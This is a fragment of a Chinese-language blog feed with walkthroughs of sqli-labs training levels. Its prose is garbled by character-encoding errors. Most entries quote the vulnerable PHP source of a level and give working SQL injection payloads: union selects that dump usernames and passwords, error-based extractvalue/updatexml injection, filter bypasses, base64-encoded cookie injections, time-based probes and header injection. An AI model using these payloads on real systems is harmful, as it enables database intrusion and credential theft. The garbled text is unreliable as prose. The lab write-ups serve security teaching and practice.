=&gt; $value)    {        $val=substr($value,0,2);        if($val=="id")        {            $id_value=substr($value,3,30);             return $id_value;            echo "&lt;br&gt;";            break;        }    }}</code></pre><p>æ‰€ä»¥å¯ä»¥æž„é€ payloadï¼š</p><pre><code>login.php?id=1&amp;id=-1' union select 1,database(),3--+</code></pre><h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30:"></a>Less-30:</h3><p>less-30çš„SQLè¯­å¥ä¸ºï¼š</p><pre><code>$id=$_GET['id'];$id = '"' .$id. '"';$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";</code></pre><p>ä»…ä»…åªæ·»åŠ äº†â€œæ³¨é‡Š</p><p>å› æ­¤ç›´æŽ¥æž„é€ payloadä¸ºï¼š</p><pre><code>login.php?id=1&amp;id=-1" union select 1,database(),3--+</code></pre><h3 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31:"></a>Less-31:</h3><p>less-31çš„SQLè¯­å¥ä¸ºï¼š</p><pre><code>$id=$_GET['id'];$id = '"' .$id. '"';$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";</code></pre><p>æ·»åŠ æ³¨é‡Šï¼ˆï¼‰å› æ­¤payloadä¸ºï¼š</p><pre><code>login.php?id=1&amp;id=-1") union select 1,database(),3--+</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs less-23-28:ç»•è¿‡æ³¨é‡Šè¿›è¡Œæ³¨å…¥</title>
      <link href="2021/07/16/sql-sqlilabs-less-23-28-rao-guo-zhu-shi-fu-guo-lu/"/>
      <url>2021/07/16/sql-sqlilabs-less-23-28-rao-guo-zhu-shi-fu-guo-lu/</url>
      
        <content type="html"><![CDATA[<h3 id="ä»‹ç»preg-replace-å‡½æ•°ï¼š"><a href="#ä»‹ç»preg-replace-å‡½æ•°ï¼š" class="headerlink" title="ä»‹ç»preg_replace() å‡½æ•°ï¼š"></a>ä»‹ç»preg_replace() å‡½æ•°ï¼š</h3><p>preg_replace å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢ã€‚</p><h4 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><pre><code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></pre><p>æœç´¢ subject ä¸­åŒ¹é… pattern çš„éƒ¨åˆ†ï¼Œ ä»¥ replacement è¿›è¡Œæ›¿æ¢ã€‚</p><p>å‚æ•°è¯´æ˜Žï¼š</p><ul><li>$pattern: è¦æœç´¢çš„æ¨¡å¼ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ã€‚</li><li>$replacement: ç”¨äºŽæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚</li><li>$subject: è¦æœç´¢æ›¿æ¢çš„ç›®æ ‡å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚</li><li>$limit: å¯é€‰ï¼Œå¯¹äºŽæ¯ä¸ªæ¨¡å¼ç”¨äºŽæ¯ä¸ª subject å­—ç¬¦ä¸²çš„æœ€å¤§å¯æ›¿æ¢æ¬¡æ•°ã€‚ é»˜è®¤æ˜¯-1ï¼ˆæ— é™åˆ¶ï¼‰ã€‚</li><li>$count: å¯é€‰ï¼Œä¸ºæ›¿æ¢æ‰§è¡Œçš„æ¬¡æ•°ã€‚</li></ul><h4 id="è¿”å›žå€¼"><a href="#è¿”å›žå€¼" class="headerlink" title="è¿”å›žå€¼"></a>è¿”å›žå€¼</h4><p>å¦‚æžœ subject æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œ preg_replace() è¿”å›žä¸€ä¸ªæ•°ç»„ï¼Œ å…¶ä»–æƒ…å†µä¸‹è¿”å›žä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p><p>å¦‚æžœåŒ¹é…è¢«æŸ¥æ‰¾åˆ°ï¼Œæ›¿æ¢åŽçš„ subject è¢«è¿”å›žï¼Œå…¶ä»–æƒ…å†µä¸‹ è¿”å›žæ²¡æœ‰æ”¹å˜çš„ subjectã€‚å¦‚æžœå‘ç”Ÿé”™è¯¯ï¼Œè¿”å›ž NULLã€‚</p><h3 id="less-23-ç»•è¿‡æ³¨é‡Šç¬¦è¿‡æ»¤ï¼ˆé‡‡ç”¨unionæ³¨å…¥ï¼‰"><a href="#less-23-ç»•è¿‡æ³¨é‡Šç¬¦è¿‡æ»¤ï¼ˆé‡‡ç”¨unionæ³¨å…¥ï¼‰" class="headerlink" title="less-23:ç»•è¿‡æ³¨é‡Šç¬¦è¿‡æ»¤ï¼ˆé‡‡ç”¨unionæ³¨å…¥ï¼‰"></a>less-23:ç»•è¿‡æ³¨é‡Šç¬¦è¿‡æ»¤ï¼ˆé‡‡ç”¨unionæ³¨å…¥ï¼‰</h3><p>æºä»£ç ä¸­ï¼š</p><pre><code>$reg = "/#/";$reg1 = "/--/";$replace = "";$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id);$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</code></pre><p>åœ¨èŽ·å–idå‚æ•°æ—¶è¿›è¡Œäº†#ï¼Œâ€“æ³¨é‡Šç¬¦å·çš„è¿‡æ»¤ã€‚</p><p>æ‰€ä»¥æž„é€ payloadï¼š</p><pre><code>?id=1' union select 1,(select database()),'3</code></pre><pre><code>?id=-1' and extractvalue(1,concat(0x7e,(select database()),0x7e)) or '1'='1</code></pre><p>ç›´æŽ¥èŽ·å–å­—æ®µï¼š</p><pre><code>?id=-1' union select 1,(select group_concat(username,0x3a,password) from users),'3</code></pre><h3 id="less-25-ç»•è¿‡orå’Œandè¿‡æ»¤ï¼ˆé‡‡ç”¨extractvalue-æŠ¥é”™æ³¨å…¥ï¼‰"><a href="#less-25-ç»•è¿‡orå’Œandè¿‡æ»¤ï¼ˆé‡‡ç”¨extractvalue-æŠ¥é”™æ³¨å…¥ï¼‰" class="headerlink" title="less-25:ç»•è¿‡orå’Œandè¿‡æ»¤ï¼ˆé‡‡ç”¨extractvalue()æŠ¥é”™æ³¨å…¥ï¼‰"></a>less-25:ç»•è¿‡orå’Œandè¿‡æ»¤ï¼ˆé‡‡ç”¨extractvalue()æŠ¥é”™æ³¨å…¥ï¼‰</h3><p>æºä»£ç ä¸­ï¼š</p><pre><code>function blacklist($id){    $id= preg_replace('/or/i',"", $id);         //strip out OR (non case sensitive)    $id= preg_replace('/AND/i',"", $id);        //Strip out AND (non case sensitive)    return $id;}$id=$_GET['id'];$id= blacklist($id);$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</code></pre><p>å¯è§æ­¤å¤„å¯¹orå’Œandè¿›è¡Œäº†è¿‡æ»¤</p><h4 id="ç»•è¿‡orå’Œandè¿‡æ»¤ï¼Œæä¾›ä»¥ä¸‹å‡ ç§æ€è·¯ï¼š"><a href="#ç»•è¿‡orå’Œandè¿‡æ»¤ï¼Œæä¾›ä»¥ä¸‹å‡ ç§æ€è·¯ï¼š" class="headerlink" title="ç»•è¿‡orå’Œandè¿‡æ»¤ï¼Œæä¾›ä»¥ä¸‹å‡ ç§æ€è·¯ï¼š"></a>ç»•è¿‡orå’Œandè¿‡æ»¤ï¼Œæä¾›ä»¥ä¸‹å‡ ç§æ€è·¯ï¼š</h4><p>1.å¤§å°å†™å˜å½¢ Or,OR,oR<br>2.ç¼–ç ï¼Œhexï¼Œurlencode<br>3.æ·»åŠ æ³¨é‡Š/<em>or</em>/<br>4.åˆ©ç”¨ç¬¦å· and=&amp;&amp;  or=||<br>5.åŒå†™oræˆ–andç»•è¿‡</p><p>less-25åªèƒ½é‡‡ç”¨æ–¹æ³•4.5ï¼Œæ‰€ä»¥ç›´æŽ¥çˆ†å­—æ®µï¼š</p><pre><code>?id=1' || extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e))--+</code></pre><h3 id="less-25a-ç»•è¿‡orå’Œandè¿‡æ»¤ï¼ˆé‡‡ç”¨unionæ³¨å…¥ï¼‰"><a href="#less-25a-ç»•è¿‡orå’Œandè¿‡æ»¤ï¼ˆé‡‡ç”¨unionæ³¨å…¥ï¼‰" class="headerlink" title="less-25a:ç»•è¿‡orå’Œandè¿‡æ»¤ï¼ˆé‡‡ç”¨unionæ³¨å…¥ï¼‰"></a>less-25a:ç»•è¿‡orå’Œandè¿‡æ»¤ï¼ˆé‡‡ç”¨unionæ³¨å…¥ï¼‰</h3><p>æºä»£ç ï¼š</p><pre><code>function blacklist($id){    $id= preg_replace('/or/i',"", $id);         //strip out OR (non case sensitive)    $id= preg_replace('/AND/i',"", $id);        //Strip out AND (non case sensitive)    return $id;}$id=$_GET['id'];$id= blacklist($id);$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";</code></pre><p>å¯¹äºŽless-25è€Œè¨€less-25aæ²¡æœ‰â€˜â€™åŒ…å«ï¼Œå’Œè¾“å‡ºé”™è¯¯é¡¹ï¼Œå› æ­¤ä¸èƒ½é‡‡ç”¨æŠ¥é”™æ³¨å…¥ï¼Œå› æ­¤å¯é‡‡ç”¨è”åˆæ³¨å…¥å’Œå»¶æ—¶æ³¨å…¥ï¼Œç›´æŽ¥çˆ†å­—æ®µï¼š</p><pre><code>?id=-1 union select 1,(select group_concat(id,0x3e,referer,0x3e,ip_address) from referers),2</code></pre><h3 id="less-26ï¼šç»•è¿‡orã€andã€æ³¨é‡Šç¬¦ã€ç©ºæ ¼ã€æ–œæ è¿‡æ»¤ï¼ˆbigintæº¢å‡ºæŠ¥é”™æ³¨å…¥ï¼‰"><a href="#less-26ï¼šç»•è¿‡orã€andã€æ³¨é‡Šç¬¦ã€ç©ºæ ¼ã€æ–œæ è¿‡æ»¤ï¼ˆbigintæº¢å‡ºæŠ¥é”™æ³¨å…¥ï¼‰" class="headerlink" title="less-26ï¼šç»•è¿‡orã€andã€æ³¨é‡Šç¬¦ã€ç©ºæ ¼ã€æ–œæ è¿‡æ»¤ï¼ˆbigintæº¢å‡ºæŠ¥é”™æ³¨å…¥ï¼‰"></a>less-26ï¼šç»•è¿‡orã€andã€æ³¨é‡Šç¬¦ã€ç©ºæ ¼ã€æ–œæ è¿‡æ»¤ï¼ˆbigintæº¢å‡ºæŠ¥é”™æ³¨å…¥ï¼‰</h3><p>æºä»£ç ï¼š</p><pre><code>function blacklist($id){    $id= preg_replace('/or/i',"", $id);         //strip out OR (non case sensitive)    $id= preg_replace('/and/i',"", $id);        //Strip out AND (non case sensitive)    $id= preg_replace('/[\/\*]/',"", $id);      //strip out /*    $id= preg_replace('/[--]/',"", $id);        //Strip out --    $id= preg_replace('/[#]/',"", $id);         //Strip out #    $id= preg_replace('/[\s]/',"", $id);        //Strip out spaces    $id= preg_replace('/[\/\\\\]/',"", $id);        //Strip out slashes    return $id;}$id=$_GET['id'];$id= blacklist($id);$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";print_r(mysql_error());</code></pre><p>å°†ç©ºæ ¼,or,and,/*,#,â€“,/ç­‰å„ç§ç¬¦å·è¿‡æ»¤</p><h4 id="å…³äºŽç©ºæ ¼ç¬¦å·çš„è¿‡æ»¤åŒ…æ‹¬ä»¥ä¸‹å‡ ç§æ–¹æ³•ï¼š"><a href="#å…³äºŽç©ºæ ¼ç¬¦å·çš„è¿‡æ»¤åŒ…æ‹¬ä»¥ä¸‹å‡ ç§æ–¹æ³•ï¼š" class="headerlink" title="å…³äºŽç©ºæ ¼ç¬¦å·çš„è¿‡æ»¤åŒ…æ‹¬ä»¥ä¸‹å‡ ç§æ–¹æ³•ï¼š"></a>å…³äºŽç©ºæ ¼ç¬¦å·çš„è¿‡æ»¤åŒ…æ‹¬ä»¥ä¸‹å‡ ç§æ–¹æ³•ï¼š</h4><ol><li>%09 TABé”®ï¼ˆæ°´å¹³ï¼‰</li><li>%0a æ–°å»ºä¸€è¡Œ</li><li>%0c æ–°çš„ä¸€é¡µ</li><li>%0d returnåŠŸèƒ½</li><li>%0b TABé”®ï¼ˆåž‚ç›´ï¼‰</li><li>%a0 ç©ºæ ¼</li></ol><p>å› æ­¤ç›´æŽ¥çˆ†æ•°æ®åº“ï¼š</p><pre><code>?id=1'%a0union%a0select%a0(!(select%a0*%a0from%a0(select%a0database())x)%a0-%a0~0),2,3%a0||%a0'1</code></pre><pre><code>?id=1'%20union%20select%20(!(select%20*%20from%20(select%20database())x)%20-%20~0),2,3%20||%20'1</code></pre><h3 id="Less-27-ç»•è¿‡unionã€selectç­‰è¿‡æ»¤unionæ³¨å…¥"><a href="#Less-27-ç»•è¿‡unionã€selectç­‰è¿‡æ»¤unionæ³¨å…¥" class="headerlink" title="Less-27 ç»•è¿‡unionã€selectç­‰è¿‡æ»¤unionæ³¨å…¥"></a>Less-27 ç»•è¿‡unionã€selectç­‰è¿‡æ»¤unionæ³¨å…¥</h3><pre><code>function blacklist($id){$id= preg_replace('/[\/\*]/',"", $id);        //strip out /*$id= preg_replace('/[--]/',"", $id);        //Strip out --.$id= preg_replace('/[#]/',"", $id);            //Strip out #.$id= preg_replace('/[ +]/',"", $id);        //Strip out spaces.$id= preg_replace('/select/m',"", $id);        //Strip out spaces.$id= preg_replace('/[ +]/',"", $id);        //Strip out spaces.$id= preg_replace('/union/s',"", $id);        //Strip out union$id= preg_replace('/select/s',"", $id);        //Strip out select $id= preg_replace('/UNION/s',"", $id);        //Strip out UNION$id= preg_replace('/SELECT/s',"", $id);        //Strip out SELECT$id= preg_replace('/Union/s',"", $id);        //Strip out Union$id= preg_replace('/Select/s',"", $id);        //Strip out selectreturn $id;}$id=$_GET['id'];$id= blacklist($id);$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";print_r(mysql_error());</code></pre><h4 id="åªéœ€è¦å°†unionå’Œselectæ”¹ä¸ºå¤§å°å†™æ··åˆå°±å¯ä»¥çªç ´ã€‚"><a href="#åªéœ€è¦å°†unionå’Œselectæ”¹ä¸ºå¤§å°å†™æ··åˆå°±å¯ä»¥çªç ´ã€‚" class="headerlink" title="åªéœ€è¦å°†unionå’Œselectæ”¹ä¸ºå¤§å°å†™æ··åˆå°±å¯ä»¥çªç ´ã€‚"></a>åªéœ€è¦å°†unionå’Œselectæ”¹ä¸ºå¤§å°å†™æ··åˆå°±å¯ä»¥çªç ´ã€‚</h4><pre><code>?id=100'unIOn%a0seLect%a01,database(),'3</code></pre><h4 id="TIPSï¼šuniuniononä¹Ÿæ˜¯å¯ä»¥çªç ´é™åˆ¶çš„ã€‚äº¦å¯ä»¥åˆ©ç”¨æŠ¥é”™æ³¨å…¥å’Œå»¶æ—¶æ³¨å…¥çš„è¯­æ³•è¿›è¡Œæ³¨å…¥ã€‚"><a href="#TIPSï¼šuniuniononä¹Ÿæ˜¯å¯ä»¥çªç ´é™åˆ¶çš„ã€‚äº¦å¯ä»¥åˆ©ç”¨æŠ¥é”™æ³¨å…¥å’Œå»¶æ—¶æ³¨å…¥çš„è¯­æ³•è¿›è¡Œæ³¨å…¥ã€‚" class="headerlink" title="TIPSï¼šuniuniononä¹Ÿæ˜¯å¯ä»¥çªç ´é™åˆ¶çš„ã€‚äº¦å¯ä»¥åˆ©ç”¨æŠ¥é”™æ³¨å…¥å’Œå»¶æ—¶æ³¨å…¥çš„è¯­æ³•è¿›è¡Œæ³¨å…¥ã€‚"></a>TIPSï¼šuniuniononä¹Ÿæ˜¯å¯ä»¥çªç ´é™åˆ¶çš„ã€‚äº¦å¯ä»¥åˆ©ç”¨æŠ¥é”™æ³¨å…¥å’Œå»¶æ—¶æ³¨å…¥çš„è¯­æ³•è¿›è¡Œæ³¨å…¥ã€‚</h4><h3 id="Less-27a-ç»•è¿‡unionã€selectç­‰è¿‡æ»¤unionæ³¨å…¥"><a href="#Less-27a-ç»•è¿‡unionã€selectç­‰è¿‡æ»¤unionæ³¨å…¥" class="headerlink" title="Less-27a ç»•è¿‡unionã€selectç­‰è¿‡æ»¤unionæ³¨å…¥"></a>Less-27a ç»•è¿‡unionã€selectç­‰è¿‡æ»¤unionæ³¨å…¥</h3><pre><code>function blacklist($id){$id= preg_replace('/[\/\*]/',"", $id);        //strip out /*$id= preg_replace('/[--]/',"", $id);        //Strip out --.$id= preg_replace('/[#]/',"", $id);            //Strip out #.$id= preg_replace('/[ +]/',"", $id);        //Strip out spaces.$id= preg_replace('/select/m',"", $id);        //Strip out spaces.$id= preg_replace('/[ +]/',"", $id);        //Strip out spaces.$id= preg_replace('/union/s',"", $id);        //Strip out union$id= preg_replace('/select/s',"", $id);        //Strip out select$id= preg_replace('/UNION/s',"", $id);        //Strip out UNION$id= preg_replace('/SELECT/s',"", $id);        //Strip out SELECT$id= preg_replace('/Union/s',"", $id);        //Strip out Union$id= preg_replace('/Select/s',"", $id);        //Strip out Selectreturn $id;}$id=$_GET['id'];$id= blacklist($id);$id = '"' .$id. '"';$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";//print_r(mysql_error());</code></pre><pre><code>?id=100"unIOn%a0seLect%a01,database(),"3</code></pre><h4 id="TIPSï¼šè¿™é‡Œè¯´ä¸‹ä»¥ä¸Špayloadæˆ‘ä»¬åˆ©ç”¨æœ€åŽçš„3å‰é¢çš„-â€œ-å°†åŽé¢çš„-â€œ-ç»™é—­åˆæŽ‰ã€‚æˆ–è€…äº¦å¯ä»¥åˆ©ç”¨ä»¥å‰çš„æ–¹æ³•-1-database-3-â€œ1ï¼ŒåŒæ—¶æœ¬å…³å¯ä»¥ç”¨å»¶æ—¶æ³¨å…¥çš„æ–¹æ³•è¿›è¡Œæ³¨å…¥ã€‚"><a href="#TIPSï¼šè¿™é‡Œè¯´ä¸‹ä»¥ä¸Špayloadæˆ‘ä»¬åˆ©ç”¨æœ€åŽçš„3å‰é¢çš„-â€œ-å°†åŽé¢çš„-â€œ-ç»™é—­åˆæŽ‰ã€‚æˆ–è€…äº¦å¯ä»¥åˆ©ç”¨ä»¥å‰çš„æ–¹æ³•-1-database-3-â€œ1ï¼ŒåŒæ—¶æœ¬å…³å¯ä»¥ç”¨å»¶æ—¶æ³¨å…¥çš„æ–¹æ³•è¿›è¡Œæ³¨å…¥ã€‚" class="headerlink" title="TIPSï¼šè¿™é‡Œè¯´ä¸‹ä»¥ä¸Špayloadæˆ‘ä»¬åˆ©ç”¨æœ€åŽçš„3å‰é¢çš„ â€œ å°†åŽé¢çš„ â€œ ç»™é—­åˆæŽ‰ã€‚æˆ–è€…äº¦å¯ä»¥åˆ©ç”¨ä»¥å‰çš„æ–¹æ³• 1,database(),3 || â€œ1ï¼ŒåŒæ—¶æœ¬å…³å¯ä»¥ç”¨å»¶æ—¶æ³¨å…¥çš„æ–¹æ³•è¿›è¡Œæ³¨å…¥ã€‚"></a>TIPSï¼šè¿™é‡Œè¯´ä¸‹ä»¥ä¸Špayloadæˆ‘ä»¬åˆ©ç”¨æœ€åŽçš„3å‰é¢çš„ â€œ å°†åŽé¢çš„ â€œ ç»™é—­åˆæŽ‰ã€‚æˆ–è€…äº¦å¯ä»¥åˆ©ç”¨ä»¥å‰çš„æ–¹æ³• 1,database(),3 || â€œ1ï¼ŒåŒæ—¶æœ¬å…³å¯ä»¥ç”¨å»¶æ—¶æ³¨å…¥çš„æ–¹æ³•è¿›è¡Œæ³¨å…¥ã€‚</h4><h3 id="Less-28-ç»•è¿‡union-s-selectç­‰è¿‡æ»¤-unionæ³¨å…¥"><a href="#Less-28-ç»•è¿‡union-s-selectç­‰è¿‡æ»¤-unionæ³¨å…¥" class="headerlink" title="Less-28 ç»•è¿‡union\s+selectç­‰è¿‡æ»¤ unionæ³¨å…¥"></a>Less-28 ç»•è¿‡union\s+selectç­‰è¿‡æ»¤ unionæ³¨å…¥</h3><pre><code>function blacklist($id){$id= preg_replace('/[\/\*]/',"", $id);                //strip out /*$id= preg_replace('/[--]/',"", $id);                //Strip out --.$id= preg_replace('/[#]/',"", $id);                    //Strip out #.$id= preg_replace('/[ +]/',"", $id);                //Strip out spaces.//$id= preg_replace('/select/m',"", $id);                    //Strip out spaces.$id= preg_replace('/[ +]/',"", $id);                //Strip out spaces.$id= preg_replace('/union\s+select/i',"", $id);        //Strip out UNION &amp; SELECT.return $id;}$id=$_GET['id'];$id= blacklist($id);$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";//print_r(mysql_error());</code></pre><p>æ­£åˆ™è¡¨è¾¾å¼â€™/union\s+select/iâ€™ä¸­ï¼Œ\sè¡¨ç¤ºç©ºæ ¼ï¼Œ+è¡¨ç¤ºåŒ¹é…ä¸€æ¬¡æˆ–å¤šæ¬¡ï¼Œ/iè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ï¼Œæ‰€ä»¥æ•´ä½“è¡¨ç¤ºåŒ¹é… unionåŠ ä¸€ä¸ªæˆ–å¤šä¸ªç©ºæ ¼åŠ selectï¼Œå…¶ä¸­unionå’Œselectä¸åŒºåˆ†å¤§å°å†™ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†union å’Œ selectä¸­é—´çš„ç©ºæ ¼ä½¿ç”¨%aæ›¿æ¢ï¼Œæˆ‘ä»¬ç›´æŽ¥ç»™å‡ºä¸€ä¸ªpayloadï¼š</p><pre><code>http://127.0.0.1/sql/Less-28/?id=100')union%a0select%a01,database(),3||('1</code></pre><h3 id="Less-28a-ç»•è¿‡union-s-selectç­‰è¿‡æ»¤-unionæ³¨å…¥"><a href="#Less-28a-ç»•è¿‡union-s-selectç­‰è¿‡æ»¤-unionæ³¨å…¥" class="headerlink" title="Less-28a ç»•è¿‡union\s+selectç­‰è¿‡æ»¤ unionæ³¨å…¥"></a>Less-28a ç»•è¿‡union\s+selectç­‰è¿‡æ»¤ unionæ³¨å…¥</h3><pre><code>function blacklist($id){//$id= preg_replace('/[\/\*]/',"", $id);                //strip out /*//$id= preg_replace('/[--]/',"", $id);                //Strip out --.//$id= preg_replace('/[#]/',"", $id);                    //Strip out #.//$id= preg_replace('/[ +]/',"", $id);                //Strip out spaces.//$id= preg_replace('/select/m',"", $id);                    //Strip out spaces.//$id= preg_replace('/[ +]/',"", $id);                //Strip out spaces.$id= preg_replace('/union\s+select/i',"", $id);        //Strip out spaces.return $id;}$id=$_GET['id'];$id= blacklist($id);$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";//print_r(mysql_error());</code></pre><pre><code>?id=100')union%a0select 1,database(),3||('1</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs less-18-22</title>
      <link href="2021/07/16/sql-sqlilabs-less-18-22/"/>
      <url>2021/07/16/sql-sqlilabs-less-18-22/</url>
      
        <content type="html"><![CDATA[<h3 id="åå…«é—œä¸­æºä»£ç¢¼ä¸­ï¼š"><a href="#åå…«é—œä¸­æºä»£ç¢¼ä¸­ï¼š" class="headerlink" title="åå…«é—œä¸­æºä»£ç¢¼ä¸­ï¼š"></a>åå…«é—œä¸­æºä»£ç¢¼ä¸­ï¼š</h3><pre><code>$uname = check_input($_POST['uname']);</code></pre><pre><code>$passwd = check_input($_POST['passwd']);</code></pre><p>å¯¹unameå’Œpasswdè¿›è¡Œäº†check_input()å‡½æ•°çš„å¤„ç†ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¾“å…¥unameå’Œpasswdä¸Šè¿›è¡Œæ³¨å…¥æ˜¯ä¸è¡Œçš„ï¼Œä½†æ˜¯åœ¨ä»£ç ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†insert()</p><pre><code>$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";</code></pre><p>æŠ“åŒ…ä»¥åŽ</p><p>å°†user-agentä¿®æ”¹ä¸º</p><pre><code>' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '1'='1</code></pre><h3 id="åä¹å…³çš„æºä»£ç ä¸­ï¼š"><a href="#åä¹å…³çš„æºä»£ç ä¸­ï¼š" class="headerlink" title="åä¹å…³çš„æºä»£ç ä¸­ï¼š"></a>åä¹å…³çš„æºä»£ç ä¸­ï¼š</h3><pre><code>$insert="INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";</code></pre><p>æ‰€ä»¥å¯å¯¹referersè¿›è¡Œä¿®æ”¹ï¼š</p><pre><code>1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '1'='1</code></pre><h3 id="äºŒåå…³æºä»£ç ä¸­ï¼š"><a href="#äºŒåå…³æºä»£ç ä¸­ï¼š" class="headerlink" title="äºŒåå…³æºä»£ç ä¸­ï¼š"></a>äºŒåå…³æºä»£ç ä¸­ï¼š</h3><pre><code>$cookee = $_COOKIE['uname'];$sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";</code></pre><p>å› æ­¤ä¿®æ”¹cookieä¸ºï¼š</p><pre><code>uname=admin' and extractvalue(1,concat(0x7e,(select database()),0x7e)) #</code></pre><h3 id="äºŒåä¸€å…³æºä»£ç ä¸­ï¼š"><a href="#äºŒåä¸€å…³æºä»£ç ä¸­ï¼š" class="headerlink" title="äºŒåä¸€å…³æºä»£ç ä¸­ï¼š"></a>äºŒåä¸€å…³æºä»£ç ä¸­ï¼š</h3><pre><code>$cookee = $_COOKIE['uname'];$cookee = base64_decode($cookee);$sql="SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1";</code></pre><p>å¯è§coookieè¿›è¡Œäº†base64ç¼–ç å¤„ç†</p><p>é‡‡ç”¨base64è§£ç åŽï¼Œä¿®æ”¹cookieä¸ºï¼š</p><pre><code>uname=YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VyKCkpLDB4N2UpLDEpICMg</code></pre><h3 id="äºŒåäºŒå…³æºä»£ç ä¸­ï¼š"><a href="#äºŒåäºŒå…³æºä»£ç ä¸­ï¼š" class="headerlink" title="äºŒåäºŒå…³æºä»£ç ä¸­ï¼š"></a>äºŒåäºŒå…³æºä»£ç ä¸­ï¼š</h3><pre><code>$cookee = $_COOKIE['uname'];$cookee = base64_decode($cookee);$cookee1 = '"'. $cookee. '"';$sql="SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1";</code></pre><p>å¯è§cookieä¸åªè¿›è¡Œäº†base64å¤„ç†ï¼Œè¿˜å¯¹unameè¿›è¡Œäº†â€unameâ€çš„å¤„ç†</p><p>æ‰€ä»¥ä¿®æ”¹cookieä¸ºï¼š</p><pre><code>uname=YWRtaW4iIGFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpKSAj</code></pre><p>è¿™é‡Œåªä»‹ç»æœ€ç®€å•çš„æŠ¥é”™æ³¨å…¥ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs less-13-14</title>
      <link href="2021/07/16/sql-sqlilabs-less-13-14/"/>
      <url>2021/07/16/sql-sqlilabs-less-13-14/</url>
      
        <content type="html"><![CDATA[<p>åœ¨usernameå¤„è¼¸å…¥</p><pre><code>admin'</code></pre><p>passwordéš¨ä¾¿è¼¸å…¥ï¼Œè¿™é‡Œè¼¸å…¥â€œ1â€</p><p>å¾—åˆ°å ±éŒ¯ï¼š</p><pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1') LIMIT 0,1' at line 1</code></pre><p>å¯è¦‹ï¼Œç¨‹åºå¯¹idé€²è¡Œäº†â€™)è™•ç†ï¼Œé€šéŽæ§‹é€ ï¼š</p><pre><code>admin') or 1=1 #</code></pre><p>ç™»é™¸æˆåŠŸå¾Œæœ¬é—œä¸å›žé¡¯æˆåŠŸä¿¡æ¯</p><h3 id="æŽ¡ç”¨ä»¥ä¸‹æ³¨å…¥æ–¹æ³•ï¼š"><a href="#æŽ¡ç”¨ä»¥ä¸‹æ³¨å…¥æ–¹æ³•ï¼š" class="headerlink" title="æŽ¡ç”¨ä»¥ä¸‹æ³¨å…¥æ–¹æ³•ï¼š"></a>æŽ¡ç”¨ä»¥ä¸‹æ³¨å…¥æ–¹æ³•ï¼š</h3><h4 id="å ±éŒ¯æ³¨å…¥ï¼š"><a href="#å ±éŒ¯æ³¨å…¥ï¼š" class="headerlink" title="å ±éŒ¯æ³¨å…¥ï¼š"></a>å ±éŒ¯æ³¨å…¥ï¼š</h4><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue:"></a>extractvalue:</h5><pre><code>admin') and extractvalue(1,concat(0x23,(select username from users limit 0,1)))-- </code></pre><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml:"></a>updatexml:</h5><pre><code>admin') and updatexml(1,concat(0x23,(select username from users limit 0,1)),1)-- </code></pre><h5 id="doubleæº¢å‡ºï¼š"><a href="#doubleæº¢å‡ºï¼š" class="headerlink" title="doubleæº¢å‡ºï¼š"></a>doubleæº¢å‡ºï¼š</h5><pre><code>admin') union select (exp(~(select * from (select username from users limit 0,1))),2-- </code></pre><h4 id="å»¶æ™‚æ³¨å…¥ï¼š"><a href="#å»¶æ™‚æ³¨å…¥ï¼š" class="headerlink" title="å»¶æ™‚æ³¨å…¥ï¼š"></a>å»¶æ™‚æ³¨å…¥ï¼š</h4><pre><code>admin') and if(substr(database(),1,1)='s',1,sleep(5))-- </code></pre><h4 id="å¸ƒçˆ¾æ³¨å…¥ï¼š"><a href="#å¸ƒçˆ¾æ³¨å…¥ï¼š" 